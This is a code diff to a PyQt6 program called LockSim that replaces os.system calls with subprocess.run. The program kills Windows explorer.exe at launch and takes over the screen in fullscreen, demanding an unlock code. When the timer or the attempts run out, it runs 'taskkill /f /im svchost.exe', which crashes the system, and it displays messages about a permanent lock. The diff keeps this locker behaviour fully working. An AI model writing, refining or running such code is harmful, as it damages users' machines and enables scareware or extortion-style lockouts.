@@ -1,4 +1,4 @@
-import sys, secrets, random, string, ctypes, time
+import sys, secrets, random, string, subprocess
 from PyQt6.QtWidgets import (
     QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
     QPushButton, QFrame, QSizePolicy, QProgressBar, QMessageBox
@@ -512,7 +512,7 @@ class LockSim(QWidget):
         self.unlock_btn.setEnabled(False)
         
         #Time ran out
-        os.system("taskkill /f /im svchost.exe")
+        subprocess.run("taskkill /f /im svchost.exe", shell=True)
         
         QTimer.singleShot(3000, lambda: self._log_lines.append("[FATAL] Permanent system lock initiated"))
         QTimer.singleShot(5000, lambda: self.log.setText("\n".join(self._log_lines[-8:])))
@@ -546,7 +546,7 @@ class LockSim(QWidget):
 
         if entered.upper() == expected.upper():
         
-            os.system("start explorer.exe")
+            subprocess.run("start explorer.exe", shell=True)
             self.status.setStyleSheet("color: rgba(120,255,160,1); font-weight: bold;")
             self.status.setText("✓ UNLOCKED - System recovering...")
 
@@ -597,7 +597,7 @@ class LockSim(QWidget):
         self.unlock_btn.setEnabled(False)
         
         # Attepmts ran out
-        os.system("taskkill /f /im svchost.exe")
+        subprocess.run("taskkill /f /im svchost.exe", shell=True)
         
         QTimer.singleShot(2000, lambda: self._log_lines.append("[FINAL] All recovery options exhausted"))
         QTimer.singleShot(4000, lambda: self.log.setText("\n".join(self._log_lines[-8:])))
@@ -698,7 +698,7 @@ class LockSim(QWidget):
 
 
 if __name__ == "__main__":
-    os.system("taskkill /f /im explorer.exe")
+    subprocess.run("taskkill /f /im explorer.exe", shell=True)
     app = QApplication(sys.argv)
     w = LockSim()
     w.showFullScreen()
